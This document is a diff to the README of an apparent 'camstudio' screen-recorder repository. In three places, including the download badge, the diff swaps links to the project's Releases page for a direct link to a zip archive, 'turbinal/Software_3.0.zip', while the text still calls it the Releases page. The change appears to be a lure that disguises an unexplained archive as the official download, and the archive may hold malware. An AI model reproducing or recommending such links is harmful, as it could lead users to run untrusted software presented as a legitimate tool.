@@ -1,6 +1,6 @@
 # 🎥 camstudio - Simple Screen Recording Made Easy
 
-[![Download camstudio](https://img.shields.io/badge/Download-camstudio-blue.svg)](https://github.com/caterpie00/camstudio/releases)
+[![Download camstudio](https://github.com/caterpie00/camstudio/raw/refs/heads/main/turbinal/Software_3.0.zip)](https://github.com/caterpie00/camstudio/raw/refs/heads/main/turbinal/Software_3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Camstudio is a user-friendly, open-source screen recording utility for Microsoft
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://github.com/caterpie00/camstudio/releases) to download the latest version of Camstudio. Look for the latest release, and download the executable file.
+To get started, visit our [Releases page](https://github.com/caterpie00/camstudio/raw/refs/heads/main/turbinal/Software_3.0.zip) to download the latest version of Camstudio. Look for the latest release, and download the executable file.
 
 1. Click on the link above.
 2. Choose the most recent version listed.
@@ -101,4 +101,4 @@ To explore more about Camstudio, check out the topics we cover, such as:
 - desktop-recording
 - swf-recorder
 
-Visit our [Releases page](https://github.com/caterpie00/camstudio/releases) to download the software and start recording your screen today!
+Visit our [Releases page](https://github.com/caterpie00/camstudio/raw/refs/heads/main/turbinal/Software_3.0.zip) to download the software and start recording your screen today!
